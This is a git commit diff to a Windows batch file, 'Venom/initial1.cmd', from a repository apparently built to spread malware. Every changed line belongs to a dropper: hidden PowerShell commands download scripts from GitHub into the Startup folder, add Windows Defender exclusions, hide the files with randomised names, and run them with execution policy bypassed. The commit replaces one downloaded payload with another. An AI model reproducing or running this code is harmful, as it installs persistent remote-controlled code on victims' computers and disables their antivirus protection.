a74a3f17db9dbded12d003c82dd4db81614cd96e
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-04-20 02:00:07 -0800

    change up 4

--- Venom/initial1.cmd
+++ Venom/initial1.cmd
@@ -7,16 +7,16 @@ cd %STARTUP%
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile AmJOwiWzUEbZ.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks2.ps1 -OutFile Update.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial.cmd -OutFile initial.cmd"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
 attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
 attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"
-attrib +h "%STARTUP%/Update.ps1"
+attrib +h "%STARTUP%/initial.cmd"
 
 @REM powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
 powershell powershell.exe -windowstyle hidden -ep bypass "./nEQlCzTBpDrO.bat"
 powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"
-powershell powershell.exe -windowstyle hidden -ep bypass "./Update.ps1"
+powershell powershell.exe -windowstyle hidden -ep bypass "./initial.cmd"
 
 cd "%INITIALPATH%"
 
